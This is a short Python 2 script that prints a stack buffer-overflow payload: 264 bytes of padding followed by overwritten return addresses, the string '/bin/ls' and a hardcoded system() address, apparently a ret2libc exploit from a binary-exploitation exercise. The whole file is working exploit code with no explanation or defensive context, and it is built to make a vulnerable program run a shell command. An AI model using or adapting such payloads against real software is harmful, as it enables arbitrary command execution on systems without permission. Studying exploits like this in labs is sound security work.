import struct

system_addr = 0x7ffff7a5b590

ret_addr = 0x4005ee

padding_len = 264

payload = "A" * padding_len + struct.pack("<Q", ret_addr) + "/bin/ls" + "\x00" + "\x11" * 8 + struct.pack("<Q", 0x4005ed) + "\x11" * 8 + struct.pack("<Q", system_addr)  

print payload

